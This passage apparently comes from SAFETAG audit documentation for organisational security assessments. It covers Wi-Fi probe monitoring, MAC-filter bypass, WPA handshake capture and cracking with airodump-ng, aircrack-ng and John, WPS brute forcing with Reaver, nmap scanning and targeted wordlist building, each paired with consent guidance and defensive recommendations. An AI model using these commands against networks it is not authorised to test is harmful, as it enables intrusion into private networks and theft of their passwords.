list](\nhttps://code.wireshark.org/review/gitweb?p=wireshark.git;a=blob_plain;f=manuf)\n\n\n###### Step 4: Ongoing Monitoring\n\nThe longer you leave this running (particularly when staff are first entering the office or returning after lunch/meetings), the better sense of what devices are connected to the network you will get.\n\nWatch what probes the various devices are sending out (especially when they are deauthenticated, as above). You will see each computer on the network, as identified by their mac addresses, broadcast information about previous networks to which they have connected.\n\n```\nBSSID              STATION            PWR   Rate    Lost    Frames Probe\n\n00:11:22:33:44:55  0F:3E:DF:DA:2D:E2  -67  0  0  234567  SampleOrg,linksys¸John Smith's iPhone,Free Public Wifi\n00:11:22:33:44:55  F8:7E:FC:03:CC:43  -80  -24  0  234567  amygreen,SampleOrg,android-hotspot,Starbucks,united_club,Dulles Airport WiFi\n00:11:22:33:44:55  F8:19:F3:DF:75:19  -58  -54  0  234567  SampleOrg\n00:11:22:33:44:55  38:08:95:EB:7E:0B  -75  -12  0  234567  HolidayInn,SampleOrg,John Smith's Mac mini,android-hotspot\n```\n","recommendations":"For most devices, deleting networks from the “saved” network list will stop\nthem from being probed. Obviously, this can be an annoyance for networks you\nregularly connect to, so renaming these networks to non-revealing names would\nhelp, as would creating non-name-associated “guest” networks for colleagues\nconnecting to your home network.\n\nOn iPhones and iPads, it is not possible to selectively remove historical\nnetworks unless you are currently in range of that network. It is however\npossible to remove all history: go to Settings > General > Reset > Reset\nNetwork Settings . When you take this step, it is worth going through this\nreset multiple times – approximately once per year of device ownership, as the\nfirst reset appears to only remove recently-connected networks, and older\nnetworks will be broadcast.\n\nOrganizations may want to choose innocent or generic network names, and/or not\nbroadcast network names. It is worth noting that devices seeking out hidden\nnetworks will \"beacon\" for the actual network name, so this has extremely\nlimited security use and must be combined with other protective measures.

Given that the\nrecommendations are often the same (move to WPA2 (and WPA3 as available),\ndisable WEP and WPS access, provide a separate guest network, etc.), this\nshould rarely be used during an audit (but is a useful skill to practice and\nunderstand how it works). If you do choose to use this during an audit, be\naware that many of the stps disrupt network traffic, and success with WPA2\npassword cracking is by no means guaranteed, so can backfire.\n\nBy walking organizations through the vulnerabilities of wireless networks, you\nhave the opportunity to discuss password strength, and the power that having\n\"offline\" access to a password means in terms of brute forcing it, as well as\nthe importance of defense in depth even within their trusted work network -\nreducing the services computers and servers are sharing, setting up local\nfirewalls on computers, and requiring authentication to access files.\n\nEven a few minutes of network \"sniffing\" by an adversary can enable them to\nwork offline to reveal the network password.  Knowing this password would let\nsomeone then access the entire internal network, files shared internally, and\neven change network settings to enable remote access.  While in an ideal\nsetup, this would give no further access to sensitive documents, it is not\nuncommon to find shared file folders, or to gain access to the firewall or\nnetwork routers (often set to the default password, because they're only\naccessible from inside the network...).\n","materials_needed":"","considerations":"*Note:* This section is one of the few sections where the SAFETAG audit does\ngo through attack scenarios, from attempting to \"break in\" to the wireless\nnetwork to testing exposed ethernet jacks for connectivity.\n\nThe reasons for this are threefold.  First, access to an organization's\ninternal network tends to reveal sensitive data and \"shadow\" infrastructures\n(such as dropbox usage) that lead to many recommendations to improve access\ncontrol and discussions of the value of defense in depth.  Second, the\nspecific act of breaking the wifi password allows for a discussion on password\nsecurity without attacking any specific user's password. Finally, with\nwireless networks treated as equivalent to wired networks in many offices,\nreminding the organization that wireless networks extend beyond the physical\nwalls of the office is useful in discussing password rotation and guest\nnetwork policies.\n\nOnce you have access to the network, you need to first document how you\nmanaged that and share it with the hosts.  This is a great moment to discuss\npasswords in many cases.\n* Confirm that all devices you are accessing/scanning belong to the organization.\n* Clarify timing and seek permission with staff - some activities can tax the network or cause disruptions.\n","walk_through":"Breaking into network requires specialized tools as well as a significant\namount of time in capturing authentication packets, and replaying those\npackets back to the wireless access point.\n\nMAC filtering is a common, but easy to bypass security measure.\n\nWEP (Wired Equivalent Privacy) has been found with several vulnerabilities.\nThe RC4 algorithm that it uses to generate the keystream for encryption is\nsubject to [two separate\nweaknesses](https://pdfs.semanticscholar.org/8aeb/2a27abc2a1d0a8b71047606fbeec0f711e03.pdf).\n\nOn the other hand, WPA/WPA2 (Wi-Fi Protected Access) is also found to be\nvulnerable to attack known as [KRACK](https://www.krackattacks.com/)(Key\nReinstallation Attacks) as well as offline (high speed) attacks against the\npassword itself. WPS, a common \"feature\" that is on by default on WPA\nnetworks, has significant vulnerabilities.\n\n[WPA3](https://www.schneier.com/blog/archives/2018/07/wpa3.html), a new\nstandard, is built to disallow offline password attacks, making it\nsignificantly harder to break in to that WPA2 networks. As it becomes\navailable and devices support it, it should be a priority upgrade if wifi\nnetwork security is a concern.\n\n___\n\n###### Variant: MAC Filtering Bypass\n\n\nOpen and MAC-address-filtered wireless access points are not only open to\nanyone within range to join and listen in to, but also do not provide\nprotection to those on the network itself, even if they do not \"broadcast\"\ntheir name.  These may seem like great ways to prevent unauthorized users from\naccessing your network without resorting to passwords, but they are trivial to\novercome.\n\n**Auditing MAC address filtered access point**\n\nThe auditor can easily gain access to an open or MAC address filtered access\npoint.\n* MAC-Address Spoofing\n  * Start the wireless interface in monitor mode\n  * Identify MAC addresses that are on the whitelist\n```bash\nairodump-ng\n```\n  * Change our MAC address to one that’s on the whitelist\n```bash\nifconfig mon0 down\nmacchanger -m [MAC ADDRESS IDENTIFIED] mon0\nifconfig mon0 up\n```\n\n**References**\n* *Tutorial:* [“Bypassing MAC Filters on WiFi Networks”](http://blog.techorganic.com/2010/12/21/bypassing-mac-filters-on-wifi-networks/) (techorganic.com)\n___\n\n###### Variant: WPA Cracking\n\n\nThe organization’s wireless Local Area Network (WLAN) protects the network and\nits users with WPA encryption. This is an important security measure, and a\nWPA-protected wireless network is much safer than an unencrypted “open”\nnetwork or a WEP-protected network. (WEP is fundamentally flawed, and\nextremely simple attacks have been widely known for over a decade.) However,\nthe ease with an attacker could guess the WPA key, or “WiFi password,” is a\nserious issue, particularly considering its importance as an essential\nperimeter control. An attacker who gains access to the wireless LAN\nimmediately bypasses many protections that network administrators, and other\nusers of the office network, often take for granted. Put another way, anyone\nable to guess the WPA key is immediately “inside the firewall.”\n\nUsing a laptop and a wireless card with a standard, internal antenna (or using\na customized smartphone or other small device), an attacker could easily\nposition themselves close enough to the office to carry out the first phase of\nthis attack, which would only take a few minutes. The second phase, which is\nsupposed to be the difficult part, could take even less time. From the privacy\nof their own home or office, the attacker could use a minimally customized\npassword dictionary to guess the WPA key .\n\n\n<!--For reporting, needs time-to-break WPA password -->\n\n\n**Materials Needed**\n\n* For the (most common) WPA password-based attacks, an already-prepared\ndictionary of words to use to attack the password will be required. See the\n[Password Strength activity](https://safetag.org/activities/password_strength) for guidance on dictionary preparation.\n\n**Instructions**\n\nAn attacker can crack the office’s WPA key in approximately with a short and\nminimally customized password dictionary based on open information about the\norganization and basic word collections.\n\n**Step 1:** The attacker customizes their WiFi password dictionary, adding\nphrases related to the subject: organization name, street address, phone\nnumber, email domain, wireless network name, etc. Common password fragments\nare included, as well: qwerty, 12345, asdf and all four-digit dates back to\nthe year 2001, for example, among others. The attacker may then add hundreds\nor thousands of words (in English and/or other relevant languages).\n\nSee the [Password Strength Activity](https://safetag.org/activities/password_strength) for details on password dictionary building\nand usage.\n\n**Step 2:** The attacker would then begin recording all (encrypted) wireless\ntraffic associated with the organization’s access point:\n\n```\n$ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0\n CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n 1A:2B:3C:4D:5E:6F  -70 100    12345    43210    6   1  12e.

STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]\n```\n\nThe goal of this step is to capture the cryptographic handshake that occurs\nwhen the targeted client reconnects. Try using different clients if the first\none doesn't work, or try (physically) moving around.\n\nThis handshake does not contain the WPA key itself, but once the the complete\nhandshake process has been seen, the auditor (or a potential attacker) can\nleave the vicinity and run various password cracking tools to try and discover\nthe password. While a complete password cracking tutorial is out of scope for\nSAFETAG documentation, below are three strategies:\n\n**Step 4:** The auditor attempts to discover the WPA password.\n\nA good wordlist with a few tweaks tends to break an unforunate number of\npasswords.  Using a collection of all english words, all words from the\nlanguage of the organization being audited, plus a combination of all these\nwords, plus relevant keywords, addresses, and years tends to crack most wifi\npasswords.\n\n```bash\n  $ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap\n```\n\nFor WPA captures, John can either feed in to an aircrack process or attack a\ncapture directly.  For captures, you first have to convert the .cap file (from\nwireshark, wifite, airodump, etc.) to a format that John likes.  The Jumbo\nversion we use has conversion tools for this available:\n\n```bash\n$wpapcap2john wpa.cap > crackme\n$./john -w:password.lst -fo=wpapsk-cuda crackme\n```\n\n**Results**\n\nSuccessful password cracking via piping these into aircrack-ng:\n\n```\n Opening sampleorg_airodump-01.cap\n Reading packets, please wait...\n                               Aircrack-ng 1.1\n                  [00:00:05] 9123 keys tested (1876.54 k/s)\n                         KEY FOUND!

That rate of approximately 2000 keys per\nsecond means that a full-on, brute-force attack against a similar-length key\nthat was truly random (and therefore immune to dictionary-based attacks) would\ntake about 70^9 or 20 trillion seconds, which is well over 600,000 years. Or,\nfor those who favor length and simplicity over brevity and complexity, a key\ncontaining four words chosen from among the 10,000 most common English\ndictionary words would still take approximately 150,000 years to crack (using\nthis method on an average laptop).\n\nIt is worth noting that an attacker with the resources and the expertise could\nincrease this rate by a factor of a hundred. Using a computer with powerful\ngraphical processing units (GPUs) or a cloud computing service like Amazon’s\nEC2, it is possible to test 250,000 or more keys per second. A setup like this\nwould still take several lifetimes to guess a strong password, however.\n\nRegardless, the success of this attack against a wireless network would allow\nan attacker to bypass all perimeter controls, including the network firewall.\nWithout access to the office LAN, a non-ISP, non-government attacker would\nhave to position themselves on the same network as an external staff member in\norder to exploit any flaws in the organization’s email or file-sharing\nservices. With access to the local network, however, that attacker could begin\ncarrying out local attacks quite quickly, and from a distance.\n\nSee the [Wireless Range Mapping Activity](https://safetag.org/activities/wireless_range_mapping) for guidance on mapping the reach of\nthe Wi-Fi network.\n\n**References**\n* *Tutorial:* [“How to Crack WPA/WPA2”](http://www.aircrack-ng.org/doku.php?id=cracking_wpa) (Aircrack-ng Wiki)\n[“Aircrack-ng”](http://www.aircrack-ng.org/doku.php?id=aircrack-ng)\n(Aircrack-ng Wiki)\n* *Documentation:* [“Aireplay-ng”](http://www.aircrack-ng.org/doku.php?id=aireplay-ng) (Aircrack-ng Wiki)\n* *Documentation:* [“Airodump-ng”](http://www.aircrack-ng.org/doku.php?id=airodump-ng) (Aircrack-ng Wiki)\n___\n\n###### Variant: WPS PIN Cracking\n\nWPS was built as an addition to WPA to make it easier to add devices without\ntyping in secure passwords, but this ease of use means that a malicious actor\ncan pose as a device and effectively reduce the potentially very difficult\npasswords WPA allows down to a simple numeric-only 8 character PIN. Further,\nthe WPS system allows an attacker to work on this PIN in two parallel chunks,\nfurther reducing its security. This, like WEP, is a &quot;live&quot; attack -\nyou have to stay connected to the network - but also like WEP, it is a\nguaranteed attack; your brute forcing of the WPS system will eventually (2-10\nhours) allow you network access.\n\n\n**Instructions**\n* Find the BSSID of the target routerr\n* Use Wash to find WPS Routers\n* Start Reaver : estimated time: Between 2 and 10 hours\n**References**\n* *Guide:* [“Hacking my own router with Reaver, guide to brute forcing Wifi Protected Setup”](http://nathanheafner.com/home/2013/01/11/hacking-my-own-router-with-reaver-guide-to-brute-forcing-wifi-protected-setup/) (Nathan Heafner)\n* *Guide:* [“WPS – How to install and use Reaver to detect the WPS on your home router”](http://uwnthesis.wordpress.com/2013/07/11/wps-how-to-install-and-use-reaver-to-detect-the-wps-on-your-home-router/) (University of South Wales)\n* *Documentation:* [“Airodump-ng”](http://www.aircrack-ng.org/doku.php?id=airodump-ng) (Aircrack-ng Wiki)\n* *Tutorial:* [“Resetting WPS\nLockouts”](https://forums.kali.org/showthread.php?19498-MDK3-Secret-Destruction-Mode)\n(Kali Linux Forums)\n\n##### Recommendation\n\n###### Recommendations for non-WPA networks\nTransitioning to WPA networks with strong passwords, even for guest networks,\nis recommended.\n\nMAC filtering and WEP provide no effective protection for a wifi network. Most\nwifi routers offer WPA encryption as an option, and if this is available it\nshould be immediately implemented. Some older routers (and wifi devices) do\nnot support WPA. It is highly recommended to upgrade immediately to hardware\nthat supports WPA and to eliminate all WEP network access. Very few devices\nstill functional do not support WPA2. As WPA3 becomes an option, upgrade to\nthat.\n\n###### Recommendations for WPA networks\n\nWPS Pin entry should be disabled on the wireless router, or only enabled\ntemporarily to add new devices to the network.\n\nChoosing a strong WPA key is one of the most important steps toward defending\nan organization’s network perimeter from an adversary with the ability to\nspend some time in the vicinity of the offices. By extension, mitigating this\nvulnerability is critical to the protection of employees and partners (and\nconfidential data) from the sort of persistent exposure that eventually brings\ndown even the most well-secured information systems.\n\nThe WPA password should be long enough and complex enough to prevent both\nstandard dictionary attacks and “brute-force attacks” in which clusters of\npowerful computers work in parallel to test every possible character\ncombination. (We recommend 12 or more completely random characters or a\npassphrase that contains four or five—or more—relatively uncommon words.) The\npassword should not contain common words, including number sequences,\nespecially if they are related to the organization, its employees or its work.\n\nA guest network, with no local network access and a distinct (possibly easier\nto communicate) password should be available if guests are ever given wifi\naccess. Because passwords for guest networks inevitably end up being written\non whiteboards, given to office visitors and emailed to partners, the guest\npassword should also be changed periodically. This does not have to happen\nfrequently, but anything less than three or four times per year may be unsafe.\n","recommendations":"Transitioning to WPA networks with strong passwords, even for guest networks,\nis recommended.\n\nMAC filtering and WEP provide no effective protection for a wifi network.

By extension, mitigating this\nvulnerability is critical to the protection of employees and partners (and\nconfidential data) from the sort of persistent exposure that eventually brings\ndown even the most well-secured information systems.\n\nThe WPA password should be long enough and complex enough to prevent both\nstandard dictionary attacks and “brute-force attacks” in which clusters of\npowerful computers work in parallel to test every possible character\ncombination. (We recommend 12 or more completely random characters or a\npassphrase that contains four or five—or more—relatively uncommon words.) The\npassword should not contain common words, including number sequences,\nespecially if they are related to the organization, its employees or its work.\n\nA guest network, with no local network access and a distinct (possibly easier\nto communicate) password should be available if guests are ever given wifi\naccess. Because passwords for guest networks inevitably end up being written\non whiteboards, given to office visitors and emailed to partners, the guest\npassword should also be changed periodically. This does not have to happen\nfrequently, but anything less than three or four times per year may be unsafe.\n"}}},{"node":{"fields":{"slug":"/activities/network_scanning"},"frontmatter":{"title":"Network Scanning","summary":"Network scanning is a technique used to gather information about devices connected on a certain network. It involves enumerating open ports and services running to determine the type of device, the operating system it is running, the applications that is it running and a lot more. There are a lot of open source tools that you can used to perform this technique. Though it may look like simple and ordinary technique, it may be used for both good and bad intentions.\n\nThe goal for this exercise is to identify, enumerate and categorize all devices connected to the network. Any device that has an IP address is our target. This may include:\n\n* Desktop computers\n* Laptop computers\n* Tablet devices\n* Mobile phones\n* Printers\n* Wireless routers\n* VoIP devices\n* Smart TVs and appliances\n* Servers and storage devices","orgSize":100,"approaches":["Technical"],"position":50,"tools":null,"remoteOptions":["with-support"],"overview":"* Confirm what devices and servers are in scope of the audit, and confirm that any service providers (website hosts, cloud hosts, etc.) are informed and OK with any scanning to be conducted.\n  * Enumerate and categorize all devices connected to the organization's network. Note that this could include IoT (Internet of Things) devices, such as IP cameras used for security, \"Smart\" devices, and personal devices such as mobile phones which may not be in scope. **Discuss the scope of the audit as it applied to devices connected to the work network and ensure the staff understand what you are doing.**\n  * In some cases, the audit scope may include external devices. The scanning in these cases will be very targeted. If your auditee agreed to have their public facing machines scanned, keep in mind that you need to consider asking your auditee for whitelisting options for shunning IDS/IPS, firewalls and other blocking mechanisms during your scan. Also make sure that you have verified the target in-scope. This is to avoid scanning out-of-scope targets that may lead you to other problems.\n* Categorize and gather additional detail on the devices that you will discover\n* Explore potential vulnerabilities, unexpected devices, and suspicious open ports\n","materials_needed":"* Laptop or appliance that can scan the network\n* nmap/zenmap\n","considerations":"* **In Scope Devices** Just always remember that some may not want you to scan\neverything on their network. To avoid this, always ask your auditee if there\nare specific devices that needs exclusion. These machine can be critical to\ntheir operation or they just don't want to get scanned. If your auditee have\nexclusions, explain the consequences possible if a machine does not undergo\nvulnerability assessment. If scanning public servers, verify that the server\nhost (web company, cloud provider, etc.) has approved of the scan, and than\nremote scanning is legal in the jurisdiction you are performing it from and in\nthe location of the remote server.\n","walk_through":"Local networks often have a variety of devices connected to them - servers,\nlaptops, printers, and user devices such as cellphones and tablets. Scanning\nthe connected devices can reveal potential areas for further research such as\nodd ports being open, out of date devices/services, forgotten servers/services\netc. These information are then reviewed in vulnerability research exercise,\nand then (if required) validated in the penetration testing exercise.\n\nUsing a network scanning tool (**nmap/zenmap** work well), discover the devices connected to the organization's network, and explore further information such as services, service banners, and operating systems. More intense scans can be too time-consuming to run across the entire network, so target those to higher value systems. As always, be aware of the scans and additional scripts you choose, and focus your exploration (in nmap) on scripts categorized as \"safe\".\n\n###### Overall Process\n\n1. Using zenmap/nmap, identify all of the devices currently active on the network.  It is worth repeating a quick scan at different times of the day and on different days to get a more complete view of the network.\n * Discover network-connected devices, including servers and workstations, but also smartphones, printers, security cameras, voip phones, and other devices.\n * Record the version and patch levels of software on the device. [^identifying-software-versions]\n2. For the active, in-scope devices, the next step is to gather additional details including hostnames, mac addresses (useful for tracking devices over multiple days, as their IP address may change), operating system and versions, port numbers, and any running services such as shared drives, remote management services and old or legacy services. Doing host enumeration sometimes takes time, as not all devices may respond to your scans in the same way. To overcome this, there are variant tools with the steps on how to perform an efficient network scan.\n * Run OS detection options\n * Scan for open ports and service banners (not all ports correctly map to their \"expected\" services, also provides service version information)\n * select additional nmap scripts and more exhaustive port scanning as needed. Filter for safe scripts!\n3. Categorize the devices that you will discover. This is to make it more efficient later when runing vulnerability scans, enabling you to target them effectively. For devices which are not easily categorized, see the IoT section below\n4. **Port/Service research, and How to decide if an open port is suspicious**  If a port is open in a personal computer or mobile device, this should be immediately considered suspicious and investigated.\n * Inspect all systems providing internal services to the host organization.\n * Identify weak ports or services available under the current device's firewall configuration. [^examining-firewalls-across-os]\n * Identify and investigate any open ports that should not be open (e.g.: almost no ports should be open in personal computers, see below)\n * Identify all odd/obscure/one-off services. [^identifying-oddone-off-services]\n5. Using the list of software versions and patches identify attacks and, if possible, identified malware that devices in the office are vulnerable to.\n\n###### Custom instructions per type of device\n\n**Servers**\n\nAn open port in a server or IoT device should be investigated if it doesn't correspond to a known service. For example, if the open port is 80, 8080, or 443, it's supposed to be open for a web server, so you can try to browse it by pasting the IP address in your browser address bar.\n\nIf it's for SSH (port 22), try to log into it through SSH.  If the service isn't supposed to be running in the identified device, you can run a scan of the open ports and request service banners, and/or try to telnet directly to the IP:port to identify what service they are connected to.\nTo identify what a port might be used for, look at the complete list at [IANA.org](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml). Using nmap's banner scripts will also reveal what the service reports itself as (for example, you can run ssh, usually port 22, on port 443, usually https). Once you have identified what service that port might be used for, always check that that service is actually running in the machine and that the user or sysadmin is aware of it.\n\nIn general, these are ports that might be open in a server:\n\n| Port         | Service        |\n| ---- | ------- |\n| 21           | FTP            |\n| 22           | SSH            |\n| 23           | Telnet         |\n| 25           | SMTP           |\n| 53           | DNS            |\n| 80           | HTTP           |\n| 110          | POP            |\n| 139          | SMB            |\n| 143          | IMAP           |\n| 194          | IRC            |\n| 443          | HTTPS          |\n| 465          | SMTP           |\n| 530          | CUPS           |\n| 587          | SMTP           |\n| 667          | IRC            |\n| 993          | IMAP           |\n| 995          | POP            |\n| 1900         | port authority |\n| 3306         | MySQL          |\n| 6881 to 6889 | Torrent        |\n| 6969         | Torrent        |\n| 8080         | HTTP           |\n\n**IoT Devices**\n\nIoT (Internet of Things) is getting popular in use because of it's ease of use and ability to address certain needs. (e.g. use of IP camera instead of CCTV). As classes of network appliances become common, additional exercises (such as the VOIP assessment) can be created.  For others, it is still worth conducting a basic assessment to determine what security implications network-connected devices may have.\n\nIn the course of network scanning, watch for devices without clear operating system identification (from nmap/zenmap), and/or devices registering as Linux or unknown (particularly if there are not Linux users or servers), and use hostnames and MAC address lookups [Wireshark](https://www.wireshark.org/tools/oui-lookup.html), [MACVendors](https://macvendors.com/) for \"hints\".\n\nFollow up on these devices with more intensive, specific scans to positively identify them, and/or follow up with staff to help physically locate the devices. Some devices, such as Smart TVs, may not even be normally thought of as devices worth considering, but if they are connected to the work network, they can add vulnerabilities.\n\nOnce any IoT devices have been identified, follow up with research as to their current and possible patch level/software update, what vulnerabilities they may have even if fully updated, and if there have been any known attacks against the platform.  Check their configuration to see if they are accessible from the Internet (directly, via UPnP, or via an external service that the device connects out to). Check to see that default passwords have been updated, and any service-connected devices have strong, unique and not-previously-breached passwords.\n\nIf there are un-mitigateable vulnerabilities, consider suggesting removing the IoT device from the network or creating a separate network disconnected from organizational resources for non-work devices.\n\n**Windows / SMB Networks**\n\n* SNMP\n* SMB\n* NetBIOS\n* Shared Folders\n* RDP\n* Telnet\n* Password Sniffing\n\nYou can use smbtree to request a list of all smb network device names and nmblookup to connect them to their IP address.\n\nUnsigned NTLM authentication messages vulnerable to Man-in-the-Middle attack on SMB file servers. It also allow an attacker on the LAN to add, remove or copy files to and from the organization’s file servers (and workstations with filesharing enabled).\n\n* On Windows, use netstat from the command prompt as an administrator: the command would be `netstat -ab` - this will show you the name of the process running on the open port.\n* To identify the process on the open port more in-depth, run the official [Microsoft Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) (right-click a process to see the Properties - the port will be visible in the TCP/IP tab and you will find more information on the path of the process in the \"Image\" tab).\n* You can investigate the process on Virustotal directly from Process Explorer, by right-clicking on the process and then clicking \"Check VirusTotal\".\n\n**MacOS**\n\n* On Mac, launch `netstat lsof` - this will show you the path of the process running on the open port.\n\n**GNULinux**\n\n* On Linux, follow [these instructions](https://www.cyberciti.biz/faq/what-process-has-open-linux-port/).\n\n###### External Network Scanning\n\nSelected scanning of external network devices (websites, webmail, extranet services) may also reveal vulnerabilities or other areas of concern. However, it is important that you seek approval or any written document that proves you have the authority to scan your target organization along with its web resources and services.\n\nExternal network scans are different for local network scans. This is because you are scanning devices that are publicly available, and can be done remotely outside the organization's premise. If your auditee agreed to have their public facing machines scanned, keep in mind that you need to consider asking your auditee for whitelisting options for shunning IDS/IPS, firewalls and other blocking mechanisms during your scan. Also make sure that you have verified the target in-scope. This is to avoid scanning out-of-scope targets that may lead you to other problems.\n\nMost of the machines you'll encounter over external network scans were:\n\n* Web servers\n* DNS servers\n* Mail servers\n* Gateway devices\n* FTP Servers\n* Cloud servers\n\n###### Using nmap/zenmap\n\nUsing a network scanning tool (**nmap/zenmap** work well), discover the devices connected to the organization's network, and explore further information such as services, service banners, and operating systems.  More intense scans can be too time-consuming to run across the entire network, so target those to higher value systems.  As always, be aware of the scans and additional scripts you choose, and focus your exploration (in nmap) on scripts categorized as safe or \"non-disruptive\".\n\n* Discover network-connected devices, including servers and workstations, but also smartphones, voip phones, and other devices.\n* Open ports\n* OS detection\n* Capture banners (not all ports correctly map to their \"expected\" services, also provides service version information)\n* additional Scripts and more exhaustive port scanning as needed (See different variants)\n\nAccording to it's nmap's website:\n> \"Nmap (\"Network Mapper\") is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. It was designed to rapidly scan large networks, but works fine against single hosts\". It's considered as the most popular network mapping tool available.\nBelow are commands to perform network scanning using Nmap.\n* **Basic Nmap Commands**\n| Command                         | Description                                                   | | ------------------------------- | ------------------------------------------------------------- | | nmap `192.168.1.1`              | Scan a single specific IP/target                              | | nmap `www.targetdomain.com`     | Scan a specific domain                                        | | nmap `172.16.1.1-35`            | Scan the IP range from 192.168.1.1 to 192.168.1.35            | | nmap `172.16.1.1/24`            | Scan a network subnet                                         | | nmap **\\-iL** `target-IPs.txt`  | Scan a list of IP from the list file `target-ip.txt`          | | nmap **\\-p 80** `172.16.1.1`    | Scan specific port/s on a target or IP range or a list file   | | nmap **\\-p 21-80** `172.16.1.1` | Scan target, IP range or list file with a specific port range | | nmap **\\-F** `172.16.1.1`       | Scan target with 100 most common ports (FAST)                 | | nmap **\\-p-** `172.16.1.1`      | Scan all 65,535 ports on a target                             |\n* **Advance Nmap Host Discovery and Port Scanning**\n\n| Option   | Command                       | Description                                                  |\n| -------- | ----------------------------- | ------------------------------------------------------------ |\n| **\\-sT** | nmap **\\-sT** `172.16.1.1`    | TCP connect port scan (with root privilege by default)       |\n| **\\-sS** | nmap **\\-sS** `172.16.1.1`    | Scan using TCP SYN port Scan                                 |\n| **\\-sU** | nmap **\\-sU** `172.16.1.1`    | Scan UDP ports                                               |\n| **\\-sA** | nmap **\\-sA** `172.16.1.1`    | Scan using TCP ACK port scan                                 |\n| **\\-sn** | nmap **\\-sn** `172.16.1.1/24` | Host discovery scan IP subnet range -

This [Ars Technica\narticle](http://arstechnica.com/security/2013/10/how-the-bible-and-youtube-are-fueling-the-next-frontier-of-password-cracking/)\nprovides a good insight into the path to tackle iterative password cracking\nusing a variety of tools to meet different goals.\n\nThese instructions use a small set of password cracking tools, but many are\npossible. If there are tools you are more familiar or comfortable with using,\nthese by no means are required. The only constraints are to be respectful and\nresponsible, as well as keeping focused on the overall goals and not getting\nbogged down.\n\nA good wordlist with a few tweaks tends to break most passwords.  Using a\ncollection of all English words, all words from the language of the\norganization being audited, plus a combination of all these words, plus\nrelevant keywords, addresses, and years tends to crack most wifi passwords in\na reasonable timeframe.\n\nAn approach which begins with quick, but often fruitful, attacks to more and\nmore complex (and time consuming) attacks is the most rewarding. However,\nafter an hour or two of password hacking, the in-office time on other\nactivities is more valuable, so admit defeat and move on.  See the\nRecommendations section for talking points around the levels of password\ncracking that exist in the world.  You can work on passwords\noffline/overnight/post-audit for report completeness.\n\nHere is a suggested path to take with suggested tools to help. You might try\nthe first few steps in both the targeted keyword approach and the dictionary\napproach before moving on to the more complex mutations towards the end of\neach path.\n\n * Targeted Keywords\n   * Begin with a simple combination of organizationally relevant keywords (using hashcat's combinator attack, combining your org keyword list with itself)\n   * Add in numbers/years (simple scripting, hashcat, JtR)\n   * Add in other mutators like 1337 replacements, capitalization tricks (John)\n * Language dictionary attack (simple scripting, hashcat)\n   * Run a series of dictionary word attacks:\n     * A simple language dictionary attack\n     * Add in numbers/years (simple scripting, hashcat, JtR)\n     * Add in the org keywords (a full combination creates a massive list, recommend starting with 1:1)\n     * Try other combinations of the dictionary, keywords, years\n     * Add in other mutators like 1337 replacements, capitalization tricks (John)\n * Brute forcing (do not bother with this on-site)\n   * John's incremental modes, limited by types\n   * Crunch's raw brute-force attack (very, very time intensive - a complete waste of time without GPUs)\n\n**Dictionary Research and Creation**\n\n**Before you arrive on-site** it is important to have your password cracking\ntools downloaded and relevant dictionaries ready to go, as your main\ndemonstration and use of these tools is to gain access to the organization's\nnetwork. The effectiveness of this demonstration is drastically reduced if you\nalready have had to ask for the password to connect to the Internet and update\nyour dictionaries, tools, or so on. Some of these  files (especially larger\npassword dictionaries) can be quite large, so downloading them in-country is\nnot recommended.\n\nMany password dictionary sites, such as\n[SkullSecurity](https://wiki.skullsecurity.org/Passwords) , maintain core\ndictionaries in multiple languages.  If your target language is not available,\nsome quick regular expression work can turn spell-check dictionaries (such as\nthose used by\n[LibreOffice](http://extensions.libreoffice.org/extension-center?getCategories=Dictionary)\ninto useful word lists.  It is generally useful to always test with English in\naddition to the target language.\n\n[CloudCracker](https://www.cloudcracker.com/dictionaries.html) and\n[OpenWall](http://www.openwall.com/wordlists/) have, for a fee, well-tested\npassword dictionaries.\n\n**Keyword generation** In addition, create a customized dictionary with words\nrelated to the subject as revealed in the Remote Assessment research:\norganization name, street address, phone number, email domain, wireless\nnetwork name, etc. For the organization \"ExampleOrg , which has its offices at\n123 Central St., Federal District, Countryzstan , which does human rights and\njournalism work and was founded in 1992, some context-based dictionary\nadditions would be:\n\n```\nexampleorg\nexample\nexa\nmple\norg\n123\ncentral\nfederal\ndistrict\ncountryzstan\nhuman\nrights\njourno\njournalism\n1992\n92\n```\n\nAlso add common password fragments: qwerty, 1234/5/6/7/8, and, based on field\nexperience, four-digit dates back to the year 2001 (plus adding in the\nfounding year of the organization). It's also useful to see what calendar\nsystem is in use at your organization's location as some cultures [don't use\nGregorian years](https://en.wikipedia.org/wiki/Calendar#Calendars_in_use).\nIt's quite amazing how often a recent year will be part of a wifi password --\nthis presentation discusses many common patterns in passwords:\n[https://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-OWASP-Feb.pdf](https://www.owasp.org/images/a/af/2011-Supercharged-Slides-Redman-OWASP-Feb.pdf)\n\n**Optional Further steps**\n\n**Use [CeWL](http://digi.ninja/projects/cewl.php) to spider the organization's\nweb properties** to generate additional phrases.  This list will need review,\nas some of the generated content is not very useful, but may be useful if the\nsite is not in a language the auditor reads fluently.\n\nFor passwords other than WPA, specific policies or patterns may help to focus\nyour password dictionary further.  [PACK, or Password Analysis and Cracking\nToolkit](https://github.com/iphelix/PACK) is a collection of utilities\ndeveloped to aid in analysis of password lists in order to enhance password\ncracking through pattern detection of masks, rules, character-sets and other\npassword characteristics. The toolkit generates valid input files for Hashcat\nfamily of password crackers.\"  PACK is most useful for large sets of\npasswords, where it can detect patterns in already-broken passwords to help\nbuild new rules. Both password cracking tools listed here are powerful, and\nhave slightly different abilities.  The auditor should choose the one they\nprefer and/or the one which has the features they desire for this job.\n\n**Build more complex password lists with scripting and Hashcat** One quick way\nto build a more complex password list is to simply double the list up 